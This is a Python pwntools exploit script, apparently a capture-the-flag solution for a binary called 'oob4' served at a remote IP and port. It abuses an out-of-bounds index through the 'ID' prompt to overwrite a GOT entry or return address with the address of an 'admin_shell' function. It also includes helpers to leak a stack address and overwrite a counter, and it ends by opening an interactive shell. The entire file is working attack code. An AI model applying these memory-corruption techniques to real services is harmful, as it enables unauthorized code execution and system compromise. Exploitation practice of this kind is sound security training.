#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./oob4"
elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 3114)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    gdbcmd = '''
    '''

    # gdb.attach(c, gdbcmd)
    context.log_level ='debug'

context.log_level ='debug'
rbp = p64(0x12334)
#main = p64(0x04006f7)

def write_got(rbp, addr):
    c.sendlineafter('ID:', str((0x48 - rbp + addr) // 8))
    c.sendlineafter('Nickname:', p64(elf.symbols['admin_shell']))
    c.sendlineafter('PIN: ', '1')
    #c.recvuntil('['

def write_ret():
    c.sendlineafter('ID:', str((0x00007fffffffe428-0x00007fffffffe450) // 8))
    c.sendlineafter('Nickname:', p64(elf.symbols['admin_shell']))
    #c.sendlineafter('PIN: ', '1')
    #c.recvuntil('['


def write_counter():
    c.sendlineafter('ID:', str((0x48 - 0x5c) // 8))
    c.sendafter('Nickname: ', p64(0x8000000000000061)) # TMIN
    #c.sendlineafter('PIN: ', '1')
    #c.recvuntil('['


def leak_rbp():
    c.sendlineafter('ID:', str((0x00007fffffffe378-0x00007fffffffe450)/8))
    c.sendlineafter('name:', '') 
    c.sendlineafter('PIN: ', '1')
    c.recvuntil('[')
    rbp = u64(c.recvuntil(']')[:-1] + b'\0\0')
    rbp =  rbp + 0x5c
    print(hex(rbp))
    return rbp



#write_ret()
#rbp = leak_rbp()
#write_got(rbp, elf.got['puts'])

#c.sendlineafter('ID:', '0')
#c.sendlineafter('Nickname:', p32(1234))
#c.sendlineafter('PIN: ', str(0))

#write_counter()
write_ret()


c.interactive()
c.close()
